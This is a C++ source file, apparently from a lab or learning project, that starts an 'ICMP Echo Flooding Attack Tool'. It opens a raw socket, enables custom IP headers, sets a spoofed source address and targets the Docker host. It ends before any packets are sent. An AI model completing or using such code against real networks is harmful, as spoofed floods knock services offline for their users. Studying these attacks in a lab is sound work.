// ICMP Echo Flooding (Ping Flooding)

#include "../include/ochlos_net.hpp"
#include <chrono> // time
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <thread>

#ifndef _WIN32
#include <netdb.h>
#include <unistd.h>
#endif

int main() {
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "[-] WSAStartup failed\n";
        return 1;
    }

    using SocketHandle = SOCKET;
    const SocketHandle kInvalidSocket = INVALID_SOCKET;
#else
    using SocketHandle = int;
    const SocketHandle kInvalidSocket = -1;
#endif

    std::cout << "[Ochlos] ICMP Echo FLooding Attack Tool Started.\n";

    // 1. ICMP Raw Socket을 생성
    SocketHandle sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock == kInvalidSocket) {
        // 실패 시 에러 메시지 및 Windows는 WSACleanup 하고 return
    }

    // 2. IP_HDRINCL option 설정
    // data buffer 앞에 L3 IP header가 포함되어 있음을 커널에 선언하는 것이다.
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, reinterpret_cast<const char *>(&one), sizeof(one)) < 0) {
        // error message & clean sock & clean WSA
    }

    // 3. target domain 해석
    // host.docker.internal은 docker 내부 컨테이너에서 docker가 실행되고 있는 호스트 pc를 가리키는 dns address이다.
    const char *target_host = "host.docker.internal";
    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_RAW;

    if (getaddrinfo(target_host, nullptr, &hints, &res) != 0 || res == nullptr) {
        // error massage & clean sock & clean WSA
    }

    uint32_t dst_ip = reinterpret_cast<struct sockaddr_in *>(res->ai_addr)->sin_addr.s_addr;
    freeaddrinfo(res);

    // 4. src ip & sendto() 대상 주소 구조체(sockaddr_in) 설정
    uint32_t src_ip = 0;
    inet_pton(AF_INET, "100.0.0.99", &src_ip);

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = 0; // ICMP는 port number가 따로 없다.
    target_addr.sin_addr.s_addr = dst_ip;
}